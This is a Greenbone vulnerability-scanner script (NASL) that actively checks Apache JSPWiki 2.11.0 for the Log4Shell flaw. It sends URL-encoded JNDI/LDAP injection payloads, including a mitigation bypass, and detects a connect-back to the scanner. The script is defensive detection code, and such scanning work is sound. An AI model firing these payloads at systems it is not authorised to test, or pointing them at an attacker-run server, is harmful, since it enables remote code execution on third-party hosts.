# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:jspwiki";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.147359");
  script_version("2025-05-15T05:40:37+0000");
  script_tag(name:"last_modification", value:"2025-05-15 05:40:37 +0000 (Thu, 15 May 2025)");
  script_tag(name:"creation_date", value:"2021-12-20 07:29:51 +0000 (Mon, 20 Dec 2021)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-12-14 01:15:00 +0000 (Tue, 14 Dec 2021)");

  script_cve_id("CVE-2021-44228");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache JSPWiki 2.11.0 Log4j RCE Vulnerability (Log4Shell) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_apache_jspwiki_http_detect.nasl");
  script_mandatory_keys("apache/jspwiki/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Apache JSPWiki is prone to a remote code execution (RCE)
  vulnerability in the Apache Log4j library dubbed 'Log4Shell'.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the target host needs to be able to reach the
  scanner host on a TCP port randomly generated during the runtime of the VT (currently in the range
  of 10000-32000).");

  script_tag(name:"insight", value:"Apache Log4j2 JNDI features used in configuration, log messages,
  and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.
  An attacker who can control log messages or log message parameters can execute arbitrary code
  loaded from LDAP servers when message lookup substitution is enabled.");

  script_tag(name:"affected", value:"Apache JSPWiki version 2.11.0 only.");

  script_tag(name:"solution", value:"Update to version 2.11.1 or later.");

  script_xref(name:"URL", value:"https://jspwiki-wiki.apache.org/Wiki.jsp?page=Log4J-CVE-2021-44228");
  script_xref(name:"URL", value:"https://logging.apache.org/log4j/2.x/security.html");
  script_xref(name:"URL", value:"https://github.com/advisories/GHSA-jfh8-c2jp-5v3q");
  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/12/10/1");
  script_xref(name:"URL", value:"https://www.lunasec.io/docs/blog/log4j-zero-day/");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used
# by most standard Linux/Unix operating systems. If we're choosing a port of that range we might
# have false positives due to race conditions (target is sending back a response to a request of
# another VT for which the scanner had chosen the same source port).
rnd_port = rand_int_range(min: 10000, max: 32000);
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("tcp and dst port ", rnd_port, " and ", src_filter, " and ", dst_filter);
# nb: We're only interested in TCP SYN packets and want to ignore all others (e.g. ACK, RST, ...)
filter = string(filter, " and tcp[tcpflags] & (tcp-syn) != 0");

payloads = make_list(
  # Original PoC for CVE-2021-44228
  "$%7Bjndi:ldap:$%7B::-/%7D/" + ownip + ":" + rnd_port + "/a%7D/",
  "$%7Bjndi:ldap:$%7B::-/%7D/" + ownhostname + ":" + rnd_port + "/a%7D/",
  # Bypass of the "allowedLdapHost" mitigation in Log4j 2.15.0:
  # https://twitter.com/marcioalm/status/1471740771581652995
  # Some reports on the net says that a valid hostname needs to be given after "#" but we check the
  # IP as well just to be sure...
  "$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1#" + ownip + ":" + rnd_port + "/a%7D/",
  "$%7Bjndi:ldap:$%7B::-/%7D/127.0.0.1#" + ownhostname + ":" + rnd_port + "/a%7D/",
  # Also try with the localhost variant just to be sure...
  "$%7Bjndi:ldap:$%7B::-/%7D/localhost#" + ownip + ":" + rnd_port + "/a%7D/",
  "$%7Bjndi:ldap:$%7B::-/%7D/localhost#" + ownhostname + ":" + rnd_port + "/a%7D/"
);

foreach payload (payloads) {

  url = dir + "/wiki/" + payload;

  req = http_get(port: port, item: url);

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames
  # / vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason:
  # If the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if (!soc = open_sock_tcp(port))
    continue;

  res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);
  close(soc);

  if (!res)
    continue;

  # nb: See note above on the reason for this check. This is just another fallback if something is
  # going wrong in the send_capture() call above.
  flags = get_tcp_element(tcp: res, element: "th_flags");
  if (flags & TH_SYN) {

    info["HTTP Method"] = "GET";
    info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

    # nb: We need to call the correct get_ip_*element() function below depending on the IP version
    # of the received IP packet.
    ip_vers_hex = hexstr(res[0]);
    if (ip_vers_hex[0] == 4) {
      src_ip = get_ip_element(ip: res, element: "ip_src");
      dst_ip = get_ip_element(ip: res, element: "ip_dst");
    } else if (ip_vers_hex[0] == 6) {
      src_ip = get_ipv6_element(ipv6: res, element: "ip6_src");
      dst_ip = get_ipv6_element(ipv6: res, element: "ip6_dst");
    }

    if (!src_ip)
      src_ip = "N/A";

    if (!dst_ip)
      dst_ip = "N/A";

    report  = 'By doing a HTTP request with the following data (excerpt):\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
    report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
    report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
    report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
    security_message(port: port, data: report);
    exit(0);
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host.
exit(0);
